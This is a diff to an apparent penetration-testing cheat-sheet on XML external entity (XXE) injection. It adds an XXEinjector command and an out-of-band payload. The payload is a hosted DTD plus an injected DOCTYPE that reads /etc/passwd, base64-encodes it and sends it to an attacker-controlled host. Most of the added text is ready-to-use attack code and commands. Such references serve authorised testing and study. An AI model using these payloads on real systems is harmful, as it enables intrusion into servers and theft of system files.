@@ -5,6 +5,24 @@
 - Check if some fields from the xml are displayed on the page to inject into
 - Check if changing the content-type to `application/xml` works ([json2xml](https://www.convertjson.com/json-to-xml.htm))
 
+## XXEinjector
+- [XXEinjector](https://github.com/enjoiz/XXEinjector)
+
+Copy a XML request from BURP and replace all of the xml except the top line with `XXEINJECT`
+
+```
+...
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?>
+XXEINJECT
+```
+
+```
+ruby XXEinjector.rb --host=<attacker-ip> --httpport=8000 --file=/req.txt --path=/etc/passwd --oob=http --phpfilter
+```
+
 ### Detection
 Check if you can read a variable from a DDT definition
 ```xml
@@ -76,3 +94,21 @@ Then reference it
   %error;
 ]>
 ```
+
+#### Out of band blind exfiltration
+See also DNS OOB Exfiltration.
+
+Host a DTD file containing something like this
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % xxe "<!ENTITY content SYSTEM 'http://<attacker-ip>:1337/?content=%file;'>">
+```
+Inject this
+```xml
+<!DOCTYPE somefield [ 
+  <!ENTITY % oob SYSTEM "http://<attacker-ip>:1337/oob.dtd">
+  %oob;
+  %xxe;
+]>
+```
+Don't forget to reference the `content` field in the xml
